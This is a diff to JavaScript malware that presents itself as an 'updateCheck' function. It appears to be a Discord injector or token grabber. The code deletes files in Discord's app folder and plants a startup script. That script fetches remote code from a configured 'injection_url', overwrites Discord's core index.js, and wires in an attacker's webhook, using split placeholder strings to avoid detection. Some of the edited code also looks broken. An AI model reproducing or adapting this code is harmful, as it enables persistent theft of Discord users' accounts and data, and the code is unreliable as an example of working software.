@@ -85,7 +85,8 @@ function updateCheck() {
     if (resourcePath === undefined || app === undefined) return;
     const appPath = path.join(resourcePath, "app"); const packageJson = path.join(appPath, "package.json");
     const resourceIndex = path.join(appPath, "index.js");
-    const indexJs = `${app}\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js`; const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
+    const indexJs = `corenum`; 
+    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
     if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
@@ -104,17 +105,17 @@ function updateCheck() {
         );
 
         const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJs = '${indexJs}';
+const indexJS = '${indexJs}';
 const bdPath = '${bdPath}';
-const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
+const fileSize = fs.statSync(indexJS).size
+fs.readFileSync(indexJS, 'utf8', (err, data) => {
     if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
         init();
 })
 async function init() {
     https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~string" + "spy~~", '${config.stringspy}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
+        const file = fs.createWriteStream(indexJS);
+        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~string" + "spy~~", '${config.stringspy}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
